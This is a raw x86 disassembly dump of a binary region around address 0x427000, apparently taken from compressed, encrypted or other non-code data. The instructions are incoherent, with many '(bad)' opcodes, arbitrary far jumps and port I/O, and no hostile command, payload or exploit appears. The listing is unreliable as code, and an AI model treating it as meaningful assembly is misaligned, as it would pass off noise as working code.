  427138:	scas   al,BYTE PTR es:[edi]
  427139:	push   esp
  42713a:	ret    0xade9
  42713d:	adc    DWORD PTR [ebp-0x22],0xffffffd9
  427141:	jno    0x42714b
  427143:	fimul  DWORD PTR [eax-0x61]
  427146:	ficom  DWORD PTR [edx]
  427148:	dec    ebx
  427149:	or     DWORD PTR [eax+0x8fe9649],edi
  42714f:	sbb    edx,0xa
  427152:	dec    esp
  427153:	ja     0x42719e
  427155:	stos   DWORD PTR es:[edi],eax
  427156:	xchg   ebp,eax
  427157:	mov    ecx,DWORD PTR [esp+edx*4+0x51]
  42715b:	hlt    
  42715c:	mov    edi,0x5131449c
  427161:	mov    DWORD PTR [ebx],esi
  427163:	jmp    0xf5289e63
  427168:	test   esi,edi
  42716a:	ror    DWORD PTR [esi+0x78],cl
  42716d:	mov    ?,WORD PTR [ebx+edi*4]
  427170:	and    BYTE PTR [edi],dh
  427172:	lahf   
  427173:	pop    ecx
  427174:	xor    DWORD PTR [ecx],edx
  427176:	clc    
  427177:	mov    ebx,DWORD PTR [esi]
  427179:	aaa    
  42717a:	std    
  42717b:	jmp    0x427144
  42717d:	add    BYTE PTR [edi],0xc2
  427180:	das    
  427181:	dec    ecx
  427182:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427183:	icebp  
  427184:	fbstp  TBYTE PTR [ecx-0x38]
  427187:	out    dx,eax
  427188:	mov    bh,0xf0
  42718a:	retf   
  42718b:	cdq    
  42718c:	inc    edx
  42718d:	adc    edi,DWORD PTR [edx+0x5175c997]
  427193:	mov    ds:0xd162c1bd,eax
  427198:	lds    eax,FWORD PTR ds:0xd89d8e28
  42719e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42719f:	lods   al,BYTE PTR ds:[esi]
  4271a0:	fistp  WORD PTR [edx-0x11eec718]
  4271a6:	dec    eax
  4271a7:	fs or  eax,0xf9e0f85d
  4271ad:	mov    ebx,0x3dd3fc4b
  4271b2:	call   0x0:0xa9b6
	...
  427215:	add    BYTE PTR [esi],bl
  427217:	inc    ecx
  427218:	fdiv   QWORD PTR [edi+ebx*8+0x77eb7ebd]
  42721f:	push   0x7e500100
  427224:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427225:	dec    esi
  427226:	mov    BYTE PTR [ecx+0x1070001],ah
  42722c:	add    BYTE PTR [eax],al
  42722e:	aam    0x14
  427230:	jns    0x427235
  427232:	int3   
  427233:	sub    ebp,esi
  427235:	paddusb mm3,QWORD PTR [eax]
  427238:	cli    
  427239:	pop    esi
  42723a:	nop
  42723b:	jo     0x427277
  42723d:	daa    
  42723e:	sbb    DWORD PTR [ebp+0x2dea1d03],esp
  427244:	adc    BYTE PTR [edx],ah
  427246:	jnp    0x427239
  427248:	fwait
  427249:	ds clc 
  42724b:	jmp    0x952:0x81395851
  427252:	mov    eax,0x1b39dec7
  427257:	aaa    
  427258:	push   esi
  427259:	inc    edi
  42725a:	inc    ebx
  42725b:	hlt    
  42725c:	sbb    esp,DWORD PTR [ebp+0x37a8c19f]
  427262:	mov    dl,0xe8
  427264:	jbe    0x42724e
  427266:	stos   BYTE PTR es:[edi],al
  427267:	xor    eax,0xcecbb61c
  42726c:	cmp    DWORD PTR [eax+0x3e],esi
  42726f:	fimul  WORD PTR [esi+0x31d6c86b]
  427275:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427276:	dec    edx
  427277:	shl    BYTE PTR [edi-0x51],1
  42727a:	jmp    0x4272d7
  42727c:	call   0x74d3dc4c
  427281:	shl    BYTE PTR [ebx-0x416bca80],cl
  427287:	in     al,0x74
  427289:	int3   
  42728a:	jo     0x42727a
  42728c:	pop    edx
  42728d:	and    eax,DWORD PTR [ebp+0x7136469d]
  427293:	mov    bh,BYTE PTR [ecx-0x3220fe6d]
  427299:	dec    edi
  42729a:	jb     0x427252
  42729c:	dec    ebx
  42729d:	sbb    edi,DWORD PTR [ebp+0x3d759ff4]
  4272a3:	arpl   WORD PTR [esi+0x46],bp
  4272a6:	push   0x4cb092c0
  4272ab:	out    0xd1,al
  4272ad:	xor    edx,ebx
  4272af:	js     0x4272b3
  4272b1:	daa    
  4272b2:	je     0x42726c
  4272b4:	sub    edi,DWORD PTR [ecx+edx*8+0xc]
  4272b8:	daa    
  4272b9:	xlat   BYTE PTR ds:[ebx]
  4272ba:	cld    
  4272bb:	jo     0x427326
  4272bd:	push   0xadb662bb
  4272c2:	add    DWORD PTR [ebx+0x77],ebx
  4272c5:	mov    eax,0x72a2d57d
  4272ca:	neg    DWORD PTR [ecx-0x6b2deaf4]
  4272d0:	mov    ss,WORD PTR [esi+0x7d]
  4272d3:	jne    0x4272ec
  4272d5:	add    eax,0x4b7fbebf
  4272da:	xchg   ebx,eax
  4272db:	pop    edx
  4272dc:	cld    
  4272dd:	gs cmc 
  4272df:	mov    ah,0x99
  4272e1:	xor    ebp,eax
  4272e3:	cmp    al,0x5e
  4272e5:	sub    edx,DWORD PTR [esi-0x6d]
  4272e8:	div    BYTE PTR [ebx-0x6c76b894]
  4272ee:	jmp    0xf395:0x66adb833
  4272f5:	(bad)  [esi+0x641dfb80]
  4272fb:	fidivr DWORD PTR [edi+0x6cc5ace]
  427301:	push   edx
  427302:	fucomi st,st(2)
  427304:	sub    cl,BYTE PTR [esi]
  427306:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427307:	push   edi
  427308:	fstp   DWORD PTR [eax-0x55]
  42730b:	sub    bl,cl
  42730d:	fadd   QWORD PTR [edx-0x27]
  427310:	mov    bh,0xd6
  427312:	cmp    eax,0xa7b8d6fe
  427317:	xchg   edx,eax
  427318:	shl    BYTE PTR [ebx-0x80],1
  42731b:	jo     0x4272a4
  42731d:	mov    ecx,0x94c4a9a9
  427322:	xor    al,ah
  427324:	and    dh,ah
  427326:	mov    ?,WORD PTR [ecx]
  427328:	cli    
  427329:	lds    edx,FWORD PTR cs:[esi]
  42732c:	popa   
  42732d:	cmp    DWORD PTR [esi+0x75],ebp
  427330:	xchg   edi,eax
  427331:	pop    ss
  427332:	in     al,dx
  427333:	repz xchg edi,eax
	...
  427395:	add    BYTE PTR [edx],dl
  427397:	sbb    eax,0xaf3f8832
  42739c:	mov    edx,0x57f28d9f
  4273a1:	push   esp
  4273a2:	loop   0x42741a
  4273a4:	pop    esi
  4273a5:	daa    
  4273a6:	(bad)  
  4273a7:	mov    ds:0x1070001,al
  4273ac:	add    BYTE PTR [eax],al
  4273ae:	sub    dl,BYTE PTR ds:0x87c5f133
  4273b4:	add    DWORD PTR ds:0x69993b10,ecx
  4273ba:	jl     0x4273ab
  4273bc:	push   ds
  4273bd:	into   
  4273be:	jnp    0x427385
  4273c0:	(bad)  
  4273c1:	mov    DWORD PTR [esi+0x6e3f68b4],esi
  4273c7:	jmp    0x427364
  4273c9:	(bad)  
  4273ca:	in     al,0xf1
  4273cc:	cmp    al,0x60
  4273ce:	fstp   DWORD PTR [edx+0x258a725a]
  4273d4:	jb     0x427411
  4273d6:	loope  0x427377
  4273d8:	push   edx
  4273d9:	dec    esp
  4273da:	call   0x79b3d248
  4273df:	adc    eax,0x941c0453
  4273e4:	in     eax,0x45
  4273e6:	and    BYTE PTR [ebx],0xc1
  4273e9:	jmp    0x4273bb
  4273eb:	outs   dx,DWORD PTR ss:[esi]
  4273ed:	or     ecx,DWORD PTR [edi]
  4273ef:	test   BYTE PTR [ebx],ch
  4273f1:	mov    esp,ds
  4273f3:	adc    bl,cl
  4273f5:	into   
  4273f6:	xlat   BYTE PTR ds:[ebx]
  4273f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4273f8:	mov    dh,0xc3
  4273fa:	fwait
  4273fb:	dec    edi
  4273fc:	xchg   edx,eax
  4273fd:	and    esp,0x5b
  427400:	arpl   WORD PTR [ebx],di
  427402:	fidiv  WORD PTR [ebp-0x3b]
  427405:	inc    ebx
  427406:	bound  ebp,QWORD PTR [eax]
  427408:	and    al,0x90
  42740a:	mov    dh,0x25
  42740c:	ret    
  42740d:	push   esp
  42740e:	jl     0x4273fe
  427410:	push   0x84065d9c
  427415:	int3   
  427416:	cmp    DWORD PTR [esi],edi
  427418:	outs   dx,BYTE PTR ds:[esi]
  427419:	sbb    bh,BYTE PTR [ebx+ebp*1-0x7e]
  42741d:	sbb    DWORD PTR [esi+eiz*1-0x4989bab9],esp
  427424:	inc    ecx
  427425:	add    DWORD PTR [ecx+ebx*8],ebp
  427428:	jmp    0x427485
  42742a:	mov    ?,ecx
  42742c:	mov    ecx,ecx
  42742e:	add    BYTE PTR [ebx],cl
  427430:	aam    0xbf
  427432:	retf   
  427433:	push   cs
  427434:	rcl    DWORD PTR [ebx-0x5886b97d],1
  42743a:	shr    ecx,cl
  42743c:	stc    
  42743d:	xor    esi,0x31a56907
  427443:	pop    edi
  427444:	push   es
  427445:	arpl   WORD PTR [ecx],sp
  427447:	xchg   ebp,eax
  427448:	js     0x4274ac
  42744a:	and    BYTE PTR [eax+edx*8-0x65],dl
  42744e:	mov    edi,0x6b92e261
  427453:	pop    ds
  427454:	xchg   DWORD PTR [edx-0x478660f3],ecx
  42745a:	cwde   
  42745b:	shr    BYTE PTR [edx],cl
  42745d:	cli    
  42745e:	and    BYTE PTR [esi],dh
  427460:	in     eax,0xf4
  427462:	das    
  427463:	les    ebx,FWORD PTR [ebp+0x1]
  427466:	jne    0x4274a8
  427468:	sbb    al,0xe3
  42746a:	test   DWORD PTR [ecx-0x6297f8b4],esp
  427470:	ret    0xf70a
  427473:	call   0xb00f:0x887b121b
  42747a:	xor    eax,0x4e20a223
  42747f:	out    0x9a,eax
  427481:	pop    ebp
  427482:	fidivr DWORD PTR [esi+0x5d]
  427485:	dec    edx
  427486:	sbb    bh,BYTE PTR [ecx+0x74cf1196]
  42748c:	push   cs
  42748d:	sbb    BYTE PTR [edi+esi*1-0x643e830d],bh
  427494:	jmp    0x4274ef
  427496:	aaa    
  427497:	retf   0xd80a
  42749a:	out    0xc6,eax
  42749c:	or     ch,dl
  42749e:	or     DWORD PTR [ebp+0x4b],edx
  4274a1:	bnd ret 
  4274a3:	add    eax,0xb7a779af
  4274a8:	jp     0x42743c
  4274aa:	pop    ds
  4274ab:	or     edi,ebp
  4274ad:	aaa    
  4274ae:	xor    bh,BYTE PTR [ebp-0x7802ac17]
  4274b4:	fiadd  DWORD PTR [eax]
	...
  427516:	pop    esp
  427517:	test   al,0xc0
  427519:	stos   DWORD PTR es:[edi],eax
  42751a:	hlt    
  42751b:	jmp    0x42759c
  42751d:	jmp    DWORD PTR [ecx-0x3d590af6]
  427523:	pop    ecx
  427524:	neg    BYTE PTR [esi+edx*4-0x5d]
  427528:	add    DWORD PTR [eax],eax
  42752a:	pop    es
  42752b:	add    DWORD PTR [eax],eax
  42752d:	add    BYTE PTR [ebp-0x4d],dl
  427530:	pop    ss
  427531:	xor    BYTE PTR [edx-0x508544d0],0x19
  427538:	or     al,0x43
  42753a:	xchg   BYTE PTR [esi],ah
  42753c:	mov    WORD PTR [edi+0xf2adebb],cs
  427542:	in     eax,0x17
  427544:	scas   al,BYTE PTR es:[edi]
  427545:	push   gs
  427547:	jo     0x42755b
  427549:	and    BYTE PTR [edi+0xe6f37f4],0x33
  427550:	jns    0x427539
  427552:	rcl    DWORD PTR [eax],0xb9
  427555:	lock stos DWORD PTR es:[edi],eax
  427557:	jnp    0x4274da
  427559:	icebp  
  42755a:	mov    cl,0x53
  42755c:	sbb    eax,0x7effbd73
  427561:	and    DWORD PTR [esi],ecx
  427563:	dec    ecx
  427564:	shl    DWORD PTR [eax],1
  427566:	aam    0xc5
  427568:	fwait
  427569:	xchg   esi,eax
  42756a:	test   DWORD PTR [eax],esi
  42756c:	es pop esp
  42756e:	rcl    DWORD PTR [ecx+ecx*2-0x31d04de8],1
  427575:	fcmovnbe st,st(1)
  427577:	sub    al,0xdb
  427579:	mov    edx,0x37342cbd
  42757e:	in     eax,0xae
  427580:	mov    ebx,0xb7f740d9
  427585:	mov    ebp,0x95359b2f
  42758a:	push   edi
  42758b:	pop    es
  42758c:	fwait
  42758d:	stos   DWORD PTR es:[edi],eax
  42758e:	jge    0x42751d
  427590:	sbb    eax,0xb0ce179b
  427595:	enter  0x3281,0x10
  427599:	inc    eax
  42759a:	jmp    0x27e9:0x350e3985
  4275a1:	jb     0x427558
  4275a3:	jne    0x427545
  4275a5:	in     eax,dx
  4275a6:	(bad)  
  4275a8:	cmp    ebp,DWORD PTR [edx+0x45]
  4275ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4275ac:	jecxz  0x427562
  4275ae:	sub    al,0x2e
  4275b0:	mov    ecx,0xd1ce176d
  4275b5:	lahf   
  4275b6:	mov    bh,0x72
  4275b8:	pop    eax
  4275b9:	dec    edi
  4275ba:	jne    0x4275db
  4275bc:	daa    
  4275bd:	pop    edx
  4275be:	mov    edx,0x9291adae
  4275c3:	add    edx,DWORD PTR [ecx]
  4275c5:	retf   
  4275c6:	jp     0x4275a3
  4275c8:	dec    esi
  4275c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4275ca:	mov    al,BYTE PTR [ebp+0x2951d05d]
  4275d0:	retf   
  4275d1:	pusha  
  4275d2:	lods   al,BYTE PTR ds:[esi]
  4275d3:	imul   edi,edi,0x4d4b7a8a
  4275d9:	mov    bl,0x27
  4275db:	mov    edx,0x3c953a22
  4275e0:	stos   DWORD PTR es:[edi],eax
  4275e1:	mov    bh,0x72
  4275e3:	enter  0x5c56,0xbf
  4275e7:	int    0xd3
  4275e9:	add    ch,dl
  4275eb:	sbb    eax,0x3df106bf
  4275f0:	cmp    esi,DWORD PTR [edi+0x1fdab936]
  4275f6:	in     al,dx
  4275f7:	aas    
  4275f8:	jmp    FWORD PTR [ecx-0x53]
  4275fb:	jb     0x427623
  4275fd:	dec    esp
  4275fe:	xor    al,0xb9
  427600:	jmp    0xa073d413
  427605:	adc    BYTE PTR [edi*2-0x7b4c95fd],0x9
  42760d:	cmp    esi,eax
  42760f:	push   0xe2aac50a
  427614:	into   
  427615:	scas   al,BYTE PTR es:[edi]
  427616:	ret    0x6a30
  427619:	mov    ah,0x24
  42761b:	push   ebp
  42761c:	jbe    0x42761b
  42761e:	test   DWORD PTR [esi+0x709d1b70],0x1b7d3c9e
  427628:	(bad)  
  427629:	sub    al,0x53
  42762b:	xchg   edi,eax
  42762c:	push   es
  42762d:	lods   eax,DWORD PTR ds:[esi]
  42762e:	dec    eax
  42762f:	idiv   DWORD PTR [eax+0x185fa61f]
	...
  427695:	add    BYTE PTR [ecx],al
  427697:	push   esi
  427698:	nop
  427699:	out    dx,al
  42769a:	xlat   BYTE PTR ds:[ebx]
  42769b:	out    dx,al
  42769c:	jg     0x42769d
  42769e:	xchg   edi,eax
  42769f:	in     eax,dx
  4276a0:	imul   ebx,eax,0x9c86d1cd
  4276a6:	popf   
  4276a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4276a8:	add    DWORD PTR [eax],eax
  4276aa:	pop    es
  4276ab:	add    DWORD PTR [eax],eax
  4276ad:	add    BYTE PTR [ebp*1-0x4b7338fe],al
  4276b4:	fnsave [edi-0x572340f7]
  4276ba:	jnp    0x427713
  4276bc:	sub    eax,0x9256f1ae
  4276c1:	outs   dx,DWORD PTR ds:[esi]
  4276c2:	push   edi
  4276c3:	(bad)  [ecx+eiz*1+0x6d739e3c]
  4276ca:	mov    ebp,0x35db8400
  4276cf:	cmp    cl,cl
  4276d1:	mov    bl,0xe
  4276d3:	cmp    eax,0x6a4cde75
  4276d8:	push   eax
  4276d9:	push   eax
  4276da:	inc    esi
  4276db:	(bad)  
  4276dc:	enter  0xdd8e,0x10
  4276e0:	lahf   
  4276e1:	rcr    DWORD PTR [ecx+0x267999b6],cl
  4276e7:	sbb    eax,0xa9a96e86
  4276ec:	inc    ecx
  4276ed:	cmp    DWORD PTR [edi-0x29],0x1e
  4276f1:	dec    ebx
  4276f2:	xor    DWORD PTR [ebx],0x7dd56cf9
  4276f8:	mov    cl,BYTE PTR ds:0x7d69d4f4
  4276fe:	shr    DWORD PTR [edi-0x18],1
  427701:	fcomp  DWORD PTR [ecx+eiz*2]
  427704:	dec    eax
  427705:	mov    al,0x16
  427707:	mov    WORD PTR [ecx+0x32a59c49],es
  42770d:	shr    BYTE PTR [edi-0x15],0x6
  427711:	sub    al,0xeb
  427713:	mov    eax,0x4734fae6
  427718:	cmp    eax,0xecad425f
  42771d:	popfw  
  42771f:	in     al,0x51
  427721:	stos   DWORD PTR es:[edi],eax
  427722:	data16 jp 0x42774f
  427725:	or     dh,ch
  427727:	outs   dx,BYTE PTR ds:[esi]
  427728:	jg     0x4276b9
  42772a:	pop    eax
  42772b:	(bad)  
  42772d:	ss push 0xffffffd0
  427730:	loope  0x4276ca
  427732:	fcomp  DWORD PTR [ecx]
  427734:	mov    ecx,0x23be1f9
  427739:	inc    ebp
  42773a:	pop    esp
  42773b:	das    
  42773c:	lods   eax,DWORD PTR ds:[esi]
  42773d:	rol    DWORD PTR [ecx-0x33b47bc1],0x92
  427744:	lahf   
  427745:	cmc    
  427746:	jecxz  0x42771c
  427748:	loopne 0x427767
  42774a:	hlt    
  42774b:	lock std 
  42774d:	cs xor al,0x4f
  427750:	dec    eax
  427751:	fs xchg esi,eax
  427753:	aas    
  427754:	out    dx,eax
  427755:	das    
  427756:	dec    ebp
  427757:	jb     0x427719
  427759:	jne    0x42779b
  42775b:	shl    BYTE PTR [eax],0xee
  42775e:	retf   
  42775f:	or     al,0x85
  427761:	div    BYTE PTR [ebp-0x1620545a]
  427767:	hlt    
  427768:	and    edi,DWORD PTR [esp+esi*2-0x60]
  42776c:	scas   al,BYTE PTR es:[edi]
  42776d:	inc    esp
  42776e:	ja     0x4277df
  427770:	or     BYTE PTR [ebx-0x653247b6],ch
  427776:	mov    al,0x54
  427778:	out    0xb2,al
  42777a:	or     DWORD PTR [edx-0x3099665e],ecx
  427780:	xchg   edi,esp
  427782:	or     eax,0xb5b94627
  427787:	sahf   
  427788:	push   edi
  427789:	pop    ecx
  42778a:	mov    al,ds:0xac0463e8
  42778f:	push   0x26fb346e
  427794:	push   esp
  427795:	pop    esi
  427796:	cs push ebp
  427798:	xor    BYTE PTR [ecx],ch
  42779a:	cmp    eax,0xd55ec3a7
  42779f:	cmp    al,0x24
  4277a1:	pop    ecx
  4277a2:	pop    ebx
  4277a3:	xchg   ebp,eax
  4277a4:	mov    ecx,0xcccdcc7a
  4277a9:	ja     0x4277b9
  4277ab:	adc    edx,ebx
  4277ad:	push   ds
  4277ae:	jo     0x42777e
  4277b0:	xchg   ebp,eax
  4277b1:	in     al,0x81
  4277b3:	sub    ch,ah
	...
  427815:	add    BYTE PTR [edx],bl
  427817:	mov    cl,BYTE PTR [ebx]
  427819:	inc    ebp
  42781a:	fwait
  42781b:	lds    ebx,FWORD PTR [esi-0x21]
  42781e:	push   edx
  42781f:	sar    DWORD PTR [edi+eiz*1],1
  427822:	pop    ebp
  427823:	mov    ecx,0xa5a419ed
  427828:	add    DWORD PTR [eax],eax
  42782a:	pop    es
  42782b:	add    DWORD PTR [eax],eax
  42782d:	add    BYTE PTR [edi-0x5e],ah
  427830:	add    bl,BYTE PTR [ecx-0x3e]
  427833:	inc    edi
  427834:	data16 outs dx,BYTE PTR ds:[esi]
  427836:	push   ss
  427837:	adc    al,0x69
  427839:	xor    al,0xc
  42783b:	sti    
  42783c:	in     al,0x7d
  42783e:	data16 or BYTE PTR [ebp+0x47de8521],0x45
  427846:	popa   
  427847:	gs jae 0x4278ab
  42784a:	xor    eax,0xfa19f206
  42784f:	std    
  427850:	inc    esp
  427851:	into   
  427852:	stc    
  427853:	inc    sp
  427855:	hlt    
  427856:	imul   ebx,DWORD PTR [edi-0x56d94b83],0x5b
  42785d:	popf   
  42785e:	xchg   edx,eax
  42785f:	(bad)  
  427860:	xchg   edi,eax
  427861:	pop    es
  427862:	push   ecx
  427863:	sub    DWORD PTR [ebx+eax*4-0x68],esi
  427867:	stc    
  427868:	mov    dl,0xc4
  42786a:	sbb    BYTE PTR [edi],cl
  42786c:	iret   
  42786d:	adc    DWORD PTR [ebx],edi
  42786f:	mov    ah,0xb9
  427871:	mov    ebp,ebp
  427873:	dec    ecx
  427874:	outs   dx,BYTE PTR ds:[esi]
  427875:	sahf   
  427876:	jno    0x427879
  427878:	neg    BYTE PTR [eax-0x5f]
  42787b:	mov    ch,0x78
  42787d:	add    eax,0xf2e61c5d
  427882:	xchg   edi,eax
  427884:	add    cl,BYTE PTR [edi-0xc81fd34]
  42788a:	dec    edx
  42788b:	das    
  42788c:	retf   
  42788d:	xchg   BYTE PTR [esi+0x46],dl
  427890:	push   edi
  427891:	push   0x6b
  427893:	rol    BYTE PTR [eax+ebx*2-0x4b],0x37
  427898:	and    DWORD PTR [esi],eax
  42789a:	leave  
  42789b:	add    dh,ch
  42789d:	imul   edx,DWORD PTR [ebx+0x34],0xabb15889
  4278a4:	leave  
  4278a5:	fadd   DWORD PTR [ecx]
  4278a7:	stos   BYTE PTR es:[edi],al
  4278a8:	cwde   
  4278a9:	sub    DWORD PTR [ebx-0x35881d84],edx
  4278af:	xchg   ebx,eax
  4278b0:	pusha  
  4278b1:	cmp    DWORD PTR [edx-0x286ac640],edx
  4278b7:	call   0x1f86ac60
  4278bc:	fucomi st,st(3)
  4278be:	mov    BYTE PTR [edx+0x33],bl
  4278c1:	gs int3 
  4278c3:	rcl    DWORD PTR [eax-0x2e],1
  4278c6:	jle    0x4278fc
  4278c8:	and    eax,0x4014a566
  4278cd:	cld    
  4278ce:	ss jmp 0x4278ad
  4278d1:	data16 loop 0x42787f
  4278d4:	inc    esp
  4278d5:	(bad)  
  4278d6:	mov    ecx,0x3e8ce542
  4278db:	xlat   BYTE PTR ds:[ebx]
  4278dc:	or     ch,bl
  4278de:	xlat   BYTE PTR ds:[ebx]
  4278df:	mov    al,0x2b
  4278e1:	ret    0x524a
  4278e4:	sub    BYTE PTR [edi-0x60],0xaa
  4278e8:	push   ecx
  4278e9:	xor    al,0x3b
  4278eb:	sbb    eax,0xe8b8fa45
  4278f0:	push   cs
  4278f1:	push   edi
  4278f2:	sub    edx,DWORD PTR [ebx+edx*4]
  4278f5:	(bad)  
  4278f6:	lods   eax,DWORD PTR ds:[esi]
  4278f7:	jle    0x427946
  4278f9:	push   ds
  4278fa:	mov    bh,0x51
  4278fc:	xchg   ebp,eax
  4278fd:	cmp    BYTE PTR [ecx-0x4d85a8eb],ah
  427903:	inc    ebx
  427904:	xor    dl,BYTE PTR [eax+0x10bd922e]
  42790a:	or     DWORD PTR [ebp+0x290d3d6f],ebx
  427910:	call   DWORD PTR [ecx]
  427912:	sub    DWORD PTR [edi],ebx
  427914:	dec    esp
  427915:	fwait
  427916:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427918:	aaa    
  427919:	(bad)  
  42791a:	jp     0x4278ce
  42791c:	retf   
  42791d:	ret    
  42791e:	pop    es
  42791f:	ficomp WORD PTR [esp+eiz*2]
  427922:	arpl   WORD PTR [ecx+0x31ff8d22],di
  427928:	jb     0x427992
  42792a:	mov    WORD PTR [ecx+eax*2],ds
  42792d:	or     bh,ah
  42792f:	jae    0x4278ba
  427931:	leave  
  427932:	pop    es
  427933:	and    ebx,eax
	...
  427995:	add    BYTE PTR [edx-0x5c0023],bl
  42799b:	mov    ds:0x63e5fdde,eax
  4279a0:	mov    ebx,0x9d2dfcd0
  4279a5:	clc    
  4279a6:	stos   DWORD PTR es:[edi],eax
  4279a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4279a8:	add    DWORD PTR [eax],eax
  4279aa:	pop    es
  4279ab:	add    DWORD PTR [eax],eax
  4279ad:	add    dh,bh
  4279af:	pop    ebx
  4279b0:	push   ds
  4279b1:	fldcw  WORD PTR [ecx]
  4279b3:	or     DWORD PTR [ecx],edx
  4279b5:	adc    eax,0xd477ceae
  4279ba:	out    0xa9,eax
  4279bc:	jmp    0xdf63:0x56322bc3
  4279c3:	or     al,0xe8
  4279c5:	jmp    0x75d6f748
  4279ca:	sub    BYTE PTR [esp+eax*8+0x58fa60f8],al
  4279d1:	add    cl,BYTE PTR [eax]
  4279d3:	xor    al,0xac
  4279d5:	repz (bad) 
  4279d7:	cmp    eax,0x690ea24f
  4279dc:	in     eax,dx
  4279dd:	fwait
  4279de:	xlat   BYTE PTR ds:[ebx]
  4279df:	loopne 0x42799d
  4279e1:	push   cs
  4279e2:	pop    edi
  4279e3:	pop    edx
  4279e4:	or     al,0xfc
  4279e6:	pop    edx
  4279e7:	lods   al,BYTE PTR ds:[esi]
  4279e8:	sahf   
  4279e9:	xchg   esi,eax
  4279ea:	xchg   BYTE PTR [ebp-0x6a],dh
  4279ed:	(bad)
  4279f0:	mov    esp,0xf4807c41
  4279f5:	cmp    BYTE PTR [esi],bl
  4279f7:	cmp    al,0x36
  4279f9:	or     al,0xa5
  4279fb:	mov    esi,0x711809e9
  427a00:	pop    ebx
  427a01:	daa    
  427a02:	pop    esp
  427a03:	in     al,dx
  427a04:	jmp    0x4279d9
  427a06:	inc    esi
  427a07:	(bad)  
  427a08:	pop    ecx
  427a09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a0a:	push   ecx
  427a0b:	aaa    
  427a0c:	mov    ebp,0x2739f84a
  427a11:	cmp    al,BYTE PTR [esi]
  427a13:	mov    edx,0x179c279e
  427a18:	ds or  eax,0xd0cdac37
  427a1e:	xrelease xchg BYTE PTR [ecx],al
  427a21:	or     eax,0x5ca71f5a
  427a26:	out    0xa7,al
  427a28:	adc    eax,0x458a11d0
  427a2d:	aam    0xf0
  427a2f:	mov    ds:0xe2a3add8,al
  427a34:	enter  0xfdd4,0xab
  427a38:	in     al,dx
  427a39:	in     al,0xd4
  427a3b:	(bad)  
  427a3c:	push   0x445eede8
  427a41:	push   ebp
  427a42:	cs stos DWORD PTR es:[edi],eax
  427a44:	mov    ah,0xf0
  427a46:	ret    
  427a47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a48:	push   ebx
  427a49:	dec    edx
  427a4a:	jae    0x427a2c
  427a4c:	loop   0x427a9f
  427a4e:	or     al,0xe
  427a50:	sar    BYTE PTR [ebp-0x7f],1
  427a53:	or     dh,BYTE PTR [esi-0x58]
  427a56:	push   ebx
  427a57:	cmp    BYTE PTR [ecx+0x11],dl
  427a5a:	mov    ebp,0xfb10e9aa
  427a5f:	inc    esp
  427a60:	cmc    
  427a61:	sbb    dl,ch
  427a63:	pop    ecx
  427a64:	adc    DWORD PTR [esi],ebp
  427a66:	and    ebx,DWORD PTR [ecx]
  427a68:	adc    edi,0x2aa5e1e6
  427a6e:	pop    edi
  427a6f:	lds    edi,FWORD PTR [edx+0x16]
  427a72:	mov    cl,0x85
  427a74:	mov    eax,ds:0xca264446
  427a79:	xor    DWORD PTR ds:[ebx+0x17798ed5],ebp
  427a80:	mov    ds:0xcf7e74f4,al
  427a85:	inc    edx
  427a86:	xlat   BYTE PTR ds:[ebx]
  427a87:	jmp    0x494fbd53
  427a8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a8d:	cmp    BYTE PTR [ebp-0x1f],ch
  427a90:	(bad)  
  427a91:	mov    edx,0xbe9f249f
  427a96:	cwde   
  427a97:	inc    esp
  427a98:	std    
  427a99:	jbe    0x427af7
  427a9b:	fcom   DWORD PTR [edi-0x3c3da969]
  427aa1:	dec    ecx
  427aa2:	add    DWORD PTR [esi-0x55b1b764],esp
  427aa8:	scas   al,BYTE PTR es:[edi]
  427aa9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427aaa:	sti    
  427aab:	jbe    0x427b1d
  427aad:	pop    esp
  427aae:	mov    esp,0x6b12f0ad
  427ab3:	inc    ebp
  427ab4:	xor    eax,DWORD PTR [eax]
	...
  427b16:	retf   0x528b
  427b19:	jnp    0x427b6e
  427b1b:	sti    
  427b1c:	jmp    0x427ad9
  427b1e:	pop    edx
  427b1f:	dec    eax
  427b20:	pop    edx
  427b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b22:	rcl    DWORD PTR ds:0xa7b2a350,1
  427b28:	add    DWORD PTR [eax],eax
  427b2a:	pop    es
  427b2b:	add    DWORD PTR [eax],eax
  427b2d:	add    BYTE PTR [eax],al
  427b2f:	jp     0x427b50
  427b31:	mov    ah,0x60
  427b33:	ja     0x427abc
  427b35:	lea    esp,[edi+0x37e7d86b]
  427b3b:	inc    ecx
  427b3c:	jmp    0x9d2a:0x3a5350c9
  427b43:	fwait
  427b44:	test   BYTE PTR [ecx+0x51b0e96a],0x23
  427b4b:	sbb    esp,DWORD PTR [edx]
  427b4d:	gs mov ebx,gs
  427b50:	push   cs
  427b51:	mov    DWORD PTR cs:[ebp-0x78],ecx
  427b55:	and    al,0x74
  427b57:	fucom  st(1)
  427b59:	sbb    ebx,ebp
  427b5b:	aad    0x3e
  427b5d:	mov    DWORD PTR [esp+eax*2],ebp
  427b60:	lahf   
  427b61:	outs   dx,BYTE PTR ds:[esi]
  427b62:	shr    DWORD PTR [edi],cl
  427b64:	shl    DWORD PTR [esi+0x4c1df47],cl
  427b6a:	js     0x427b30
  427b6c:	push   ebx
  427b6d:	add    eax,0xb3e74d76
  427b72:	mov    eax,ds:0x7474c845
  427b77:	mov    edi,0xb12d6915
  427b7c:	hlt    
  427b7d:	test   DWORD PTR [eax+0x27e543b],0xbd0299e6
  427b87:	std    
  427b88:	or     bl,BYTE PTR [ecx]
  427b8a:	arpl   WORD PTR [eax],bp
  427b8c:	push   ebp
  427b8d:	mov    bh,0x97
  427b8f:	dec    edi
